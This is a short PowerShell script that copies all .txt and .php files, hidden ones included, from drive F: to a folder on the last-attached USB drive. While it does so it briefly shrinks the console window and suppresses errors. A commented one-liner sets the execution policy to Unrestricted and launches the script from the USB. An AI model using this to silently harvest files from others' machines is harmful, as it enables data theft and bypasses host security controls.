function getLastUsbLetter{
    return ((Get-Partition -DiskNumber ((Get-Disk).Length - 1)).DriveLetter)
}
function copyAll{
    Clear-Host
    [console]::windowwidth=1; [console]::windowheight=1; [console]::bufferwidth=[console]::windowwidth
    $letter = (getLastUsbLetter)
    $files = (Get-ChildItem "F`:" -Force -ErrorAction SilentlyContinue -Recurse -Include ('*.txt','*.php'))
    Write-Host $files[2].FullName
    $length = $files.Count
    $count = 0;
    [console]::windowwidth=125; [console]::windowheight=10; [console]::bufferwidth=[console]::windowwidth
    foreach($file in $files){
        if ( ($file.FullName).EndsWith(".php") -eq 'True' ) 
        { Write-Host $file.FullName -ForegroundColor Red}
        elseif ( ($file.FullName).EndsWith(".txt") -eq 'True' ) 
        { Write-Host $file.FullName -ForegroundColor Blue}
        elseif ( ($file.FullName).EndsWith(".html") -eq 'True' ) 
        { Write-Host $file.FullName -ForegroundColor Green}
        else {Write-Host $file.FullName -ForegroundColor Magenta}
        # Write-Host $file.FullName
        Copy-Item -Force -Path $file.FullName -Destination ("$letter`:/container") -ErrorAction SilentlyContinue
        $count++;
        Write-Progress -Activity "[Copying to Drive $letter`:...]"  -Status "In Progress [$count / $length]" -PercentComplete (($count/$length) * 100) -Id 1
    }
    Write-Progress -Activity "[Copying to Drive $letter`:...]" -Status "Complete" -Completed -Id 1
}
copyAll
#powershell -command "$l=((Get-Partition -DiskNumber ((Get-Disk).Length - 1)).DriveLetter);Set-ExecutionPolicy Unrestricted -Force ; powershell -File \"$l`:\USBCopy_with_GUI.ps1\" ; exit"
